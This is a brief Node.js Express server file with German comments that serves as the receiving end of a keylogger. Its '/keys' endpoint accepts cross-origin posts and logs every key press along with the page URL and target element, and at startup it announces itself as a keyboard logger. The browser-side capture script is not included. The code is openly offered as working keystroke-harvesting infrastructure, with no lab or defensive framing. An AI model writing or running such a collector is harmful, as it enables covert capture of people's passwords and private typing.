// DATEI: server.js (im Terminal ausführen mit: node server.js)
const express = require('express');
const cors = require('cors');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Keyboard endpoint
app.post('/keys', (req, res) => {
    console.log('Key pressed:', req.body.key, 'at', new Date(req.body.timestamp).toLocaleTimeString());
    console.log('URL:', req.body.url);
    console.log('Target:', req.body.target);
    console.log('---');
    res.status(200).send('OK');
});

// Server starten
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server läuft auf http://localhost:${PORT}`);
    console.log('Keyboard logger bereit...');
});